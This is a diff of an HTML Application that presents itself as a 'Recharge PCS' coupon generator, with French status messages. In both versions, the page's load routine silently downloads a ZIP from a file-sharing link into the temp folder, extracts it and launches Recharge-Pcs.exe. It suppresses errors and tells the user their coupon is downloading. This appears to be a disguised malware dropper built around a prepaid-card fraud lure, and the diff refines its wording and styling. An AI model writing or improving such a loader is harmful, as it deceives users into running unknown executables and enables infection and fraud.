@@ -1,8 +1,8 @@
 <html>
 <head>
 <HTA:APPLICATION 
-  ID="RechargeApp"
-  APPLICATIONNAME="Recharge PCS Generator"
+  ID="App"
+  APPLICATIONNAME="Recharge PCS"
   BORDER="dialog"
   CAPTION="yes"
   SHOWINTASKBAR="yes"
@@ -13,43 +13,36 @@
 <style>
   body {
     font-family: Arial, sans-serif;
-    background-color: #fdfdfd;
-    text-align: center;
+    background-color: #fefefe;
+    color: #333;
     padding: 40px;
+    text-align: center;
   }
   h1 {
-    color: #e74c3c;
-    font-size: 1.8em;
-    margin-bottom: 20px;
+    color: #e67e22;
+    font-size: 2em;
   }
   .status {
+    margin-top: 20px;
     font-size: 1.1em;
-    color: #2c3e50;
-    margin-top: 30px;
+    color: #2980b9;
   }
 </style>
 <script language="VBScript">
 Sub Window_OnLoad
   On Error Resume Next
 
-  ' Affichage d'un message d'état
-  document.body.insertAdjacentHTML "beforeEnd", "<div class='status' id='status'>📦 Téléchargement en cours...</div>"
+  document.body.insertAdjacentHTML "beforeEnd", "<div class='status' id='status'>Téléchargement de votre coupon en cours...</div>"
 
-  ' Déclaration des objets
-  Dim fso, shell, shellApp, tempFolder, zipPath, extractPath, exePath, http, stream
-
+  Dim fso, shell, tempFolder, zipURL, zipPath, extractPath, http, stream, shellApp, exePath
   Set fso = CreateObject("Scripting.FileSystemObject")
   Set shell = CreateObject("WScript.Shell")
-  Set shellApp = CreateObject("Shell.Application")
   tempFolder = shell.ExpandEnvironmentStrings("%TEMP%")
   zipPath = tempFolder & "\Recharge-Pcs.zip"
   extractPath = tempFolder & "\RechargePCS"
-  exePath = extractPath & "\Recharge-Pcs.exe"
 
-  ' URL du fichier ZIP
   zipURL = "https://e.pcloud.link/publink/download?code=XZBl96ZDcumxqXn19QSerxY4ULg1FBqjotk"
 
-  ' Téléchargement du ZIP
   Set http = CreateObject("Microsoft.XMLHTTP")
   http.Open "GET", zipURL, False
   http.Send
@@ -61,26 +54,28 @@ Sub Window_OnLoad
     stream.Write http.responseBody
     stream.SaveToFile zipPath, 2
     stream.Close
-    document.getElementById("status").innerText = "✅ Téléchargement terminé. Décompression..."
+    document.getElementById("status").innerText = "✅ Téléchargement terminé. Extraction..."
   Else
-    MsgBox "Erreur de téléchargement: " & http.Status, vbCritical, "Erreur"
+    MsgBox "Erreur de téléchargement. Code HTTP: " & http.Status, 16, "Erreur"
     Exit Sub
   End If
 
-  ' Extraction du ZIP
-  If Not fso.FolderExists(extractPath) Then fso.CreateFolder extractPath
-  shellApp.NameSpace(extractPath).CopyHere shellApp.NameSpace(zipPath).Items()
+  If Not fso.FolderExists(extractPath) Then
+    fso.CreateFolder extractPath
+  End If
 
-  ' Pause pour laisser le temps d’extraction (ajuster si nécessaire)
+  Set shellApp = CreateObject("Shell.Application")
+  shellApp.NameSpace(extractPath).CopyHere shellApp.NameSpace(zipPath).Items(), 4
+
   Dim i
   For i = 1 To 10
     WScript.Sleep 500
   Next
 
-  ' Exécution
+  exePath = extractPath & "\Recharge-Pcs.exe"
   If fso.FileExists(exePath) Then
     shell.Run Chr(34) & exePath & Chr(34), 1, False
-    document.getElementById("status").innerText = "🚀 Recharge-Pcs.exe lancé avec succès !"
+    document.getElementById("status").innerText = "🎉 Recharge lancée avec succès !"
   Else
     document.getElementById("status").innerText = "❌ Recharge-Pcs.exe introuvable après extraction."
   End If
